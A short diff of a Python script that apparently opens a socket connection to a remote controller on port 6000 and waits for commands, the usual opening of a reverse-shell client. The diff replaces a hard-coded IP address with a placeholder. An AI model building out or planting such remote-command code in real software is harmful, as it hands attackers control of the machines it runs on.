@@ -1,9 +1,8 @@
 import socket
-import os
 import subprocess
 
 s= socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-s.connect(("10.52.84.19",6000))
+s.connect(("XX.XX.XX.XX",6000))
 c = s.recv(2048)
 
 ref = ""
